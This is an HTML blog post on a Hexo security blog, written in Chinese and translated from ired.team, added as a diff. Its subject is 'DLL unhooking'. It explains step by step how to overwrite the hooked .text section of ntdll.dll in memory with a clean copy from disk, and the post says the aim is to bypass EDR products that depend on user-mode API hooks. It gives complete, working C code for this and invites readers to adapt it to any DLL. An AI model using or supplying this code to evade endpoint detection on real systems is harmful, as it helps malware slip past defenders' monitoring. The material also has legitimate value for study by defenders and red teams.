@@ -1,0 +1,325 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>DLL解钩技术 | 0pen1的博客</title>
+  <meta name="author" content="0pen1">
+  
+  <meta name="description" content="通过从磁盘读取 ntdll.dll 的 .text 部分并将其放在映射到内存中的 ntdll.dll 的 .text 部分的顶部，可以完全解钩（unhook）加载到内存中的任何给定 DLL。这可能有助于bypass一些依赖用户态 API 挂钩的 EDR 解决方案。
+概述解钩DLL的过程如下面所示。假设ntdll.dll被钩（hook）住了，现在我们来演示如何解钩（unhook）:
+
+将ntdll.dll的全新副本从磁盘映射到内存。
+找到被钩住的 ntdll.dll 的 .text 部分的虚拟地址（先找到ntdll.dll的基地址，然后用基地址加上.text部分的偏移地址就得到了.text部分的虚拟地址）。
+找到新映射的ntdll.dll的.text部分的虚拟地址。
+获取被挂钩模块的 .text 部分的原始内存保护
+将 .text 部分从新映射的 dll 复制到原始（挂钩）ntdll.dll 的虚拟地址（在第 3 步中找到） - 这是解钩的主要内容，因为所有挂钩字节都被磁盘中的新字节覆盖。
+将原始内存保护应用到原始 ntdll.dll 的解钩的 .text 部分。
+
+下面是一个简化图，说明了该技术的核心概念，其中 ntdll.dll 的挂钩 .text 部分被替换为磁盘上 ntdll.dll 的 .text 部分的干净副本：
+
+代码下面的代码是解钩ntdll.dll的示例，你可以将它修改成解钩任何DLL的代码。
+123456789101112131415161718192021222324252627282930313233343536373839#include &amp;quot;pch.h&amp;quot;#include &amp;lt;iostream&amp;gt;#include &amp;lt;Windows.h&amp;gt;#include &amp;lt;winternl.h&amp;gt;#include &amp;lt;psapi.h&amp;gt;int main()&amp;#123;	HANDLE process = GetCurrentProcess();	MODULEINFO mi = &amp;#123;&amp;#125;;	HMODULE ntdllModule = GetModuleHandleA(&amp;quot;ntdll.dll&amp;quot;);		GetModuleInformation(process, ntdllModule, &amp;amp;mi, sizeof(mi));	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;	HANDLE ntdllFile = CreateFileA(&amp;quot;c:\\windows\\system32\\ntdll.dll&amp;quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&amp;gt;e_lfanew);	for (WORD i = 0; i &amp;lt; hookedNtHeader-&amp;gt;FileHeader.NumberOfSections; i++) &amp;#123;		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));				if (!strcmp((char*)hookedSectionHeader-&amp;gt;Name, (char*)&amp;quot;.text&amp;quot;)) &amp;#123;			DWORD oldProtection = 0;			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&amp;gt;VirtualAddress), hookedSectionHeader-&amp;gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;amp;oldProtection);			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&amp;gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&amp;gt;VirtualAddress), hookedSectionHeader-&amp;gt;Misc.VirtualSize);			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&amp;gt;VirtualAddress), hookedSectionHeader-&amp;gt;Misc.VirtualSize, oldProtection, &amp;amp;oldProtection);		&amp;#125;	&amp;#125;		CloseHandle(process);	CloseHandle(ntdllFile);	CloseHandle(ntdllMapping);	FreeLibrary(ntdllModule);		return 0;&amp;#125;
+
+请注意，上面的代码没有映像基址重定位。尽管 ntdll.dll 在其 .text 部分中没有任何要重定位的内容，但在处理其他 dll 时可能需要它。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="DLL解钩技术"/>
+  <meta property="og:site_name" content="0pen1的博客"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">0pen1的博客</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> DLL解钩技术</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>通过从磁盘读取 ntdll.dll 的 .text 部分并将其放在映射到内存中的 ntdll.dll 的 .text 部分的顶部，可以完全解钩（unhook）加载到内存中的任何给定 DLL。这可能有助于bypass一些依赖用户态 API 挂钩的 EDR 解决方案。</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>解钩DLL的过程如下面所示。假设ntdll.dll被钩（hook）住了，现在我们来演示如何解钩（unhook）:</p>
+<ol>
+<li>将ntdll.dll的全新副本从磁盘映射到内存。</li>
+<li>找到被钩住的 ntdll.dll 的 .text 部分的虚拟地址（先找到ntdll.dll的基地址，然后用基地址加上.text部分的偏移地址就得到了.text部分的虚拟地址）。</li>
+<li>找到新映射的ntdll.dll的.text部分的虚拟地址。</li>
+<li>获取被挂钩模块的 .text 部分的原始内存保护</li>
+<li>将 .text 部分从新映射的 dll 复制到原始（挂钩）ntdll.dll 的虚拟地址（在第 3 步中找到） - 这是解钩的主要内容，因为所有挂钩字节都被磁盘中的新字节覆盖。</li>
+<li>将原始内存保护应用到原始 ntdll.dll 的解钩的 .text 部分。</li>
+</ol>
+<p>下面是一个简化图，说明了该技术的核心概念，其中 ntdll.dll 的挂钩 .text 部分被替换为磁盘上 ntdll.dll 的 .text 部分的干净副本：</p>
+<p><img src="DLL%E8%A7%A3%E9%92%A9%E6%8A%80%E6%9C%AF.assets/assets/-LFEMnER3fywgFHoroYn/-M9b77N-cstE2jRzZI4M/-M9b7TdH_eS5azVO-Vxe/image.png" alt="img"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>下面的代码是解钩ntdll.dll的示例，你可以将它修改成解钩任何DLL的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE process = GetCurrentProcess();</span><br><span class="line">	MODULEINFO mi = &#123;&#125;;</span><br><span class="line">	HMODULE ntdllModule = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	GetModuleInformation(process, ntdllModule, &amp;mi, <span class="keyword">sizeof</span>(mi));</span><br><span class="line">	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;</span><br><span class="line">	HANDLE ntdllFile = CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)hookedSectionHeader-&gt;Name, (<span class="keyword">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">			DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">bool</span> isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	CloseHandle(process);</span><br><span class="line">	CloseHandle(ntdllFile);</span><br><span class="line">	CloseHandle(ntdllMapping);</span><br><span class="line">	FreeLibrary(ntdllModule);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请注意，上面的代码没有映像基址重定位。尽管 ntdll.dll 在其 .text 部分中没有任何要重定位的内容，但在处理其他 dll 时可能需要它。</p>
+<p>翻译自：<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++#overview">https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++#overview</a></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/12/29/DLL%E8%A7%A3%E9%92%A9%E6%8A%80%E6%9C%AF/" class="leancloud-visitors view" data-flag-title="DLL解钩技术">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/12/29/SpringBoot信息泄露/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-12-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/免杀/">免杀<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 0pen1's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
